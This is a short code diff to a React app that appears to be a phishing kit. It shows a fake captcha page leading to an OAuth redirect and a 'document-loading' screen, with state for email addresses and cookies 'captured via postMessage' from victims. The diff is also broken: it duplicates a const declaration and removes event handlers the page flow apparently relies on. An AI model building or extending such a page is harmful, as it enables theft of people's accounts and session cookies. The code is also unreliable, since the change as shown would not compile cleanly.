@@ -15,9 +15,11 @@ const captchaVerificationDelay = 1500; // Default verification delay for captcha
 // Calculate total delay for captcha to handle everything internally
 const totalCaptchaDelay = captchaVerificationDelay + messageIconDelay + nextStepDelay;
 
+// Calculate total delay for captcha to handle everything internally
+const totalCaptchaDelay = captchaVerificationDelay + messageIconDelay + nextStepDelay;
+
 function App() {
   const [currentPage, setCurrentPage] = useState('captcha');
-
   // State to hold the most reliable email and cookies captured via postMessage
   const [capturedEmail, setCapturedEmailState] = useState<string | null>(null);
   const [capturedCookies, setCapturedCookiesState] = useState<string | null>(null);
@@ -249,20 +251,9 @@ function App() {
   }, []);
 
   // Captcha verified: immediately go to oauth redirect (no delay)
-  const handleCaptchaVerified = () => {
-    setCurrentPage('oauth-redirect');
-  };
-
-  const handleCaptchaBack = () => {
-    window.location.reload();
-  };
-
-  const handleOAuthSuccess = async (sessionData: any) => {
-    setCurrentPage('document-loading');
-  };
 
   const handleOAuthBack = () => {
-    setCurrentPage('message-icon');
+    setCurrentPage('oauth-redirect');
   };
 
   switch (currentPage) {
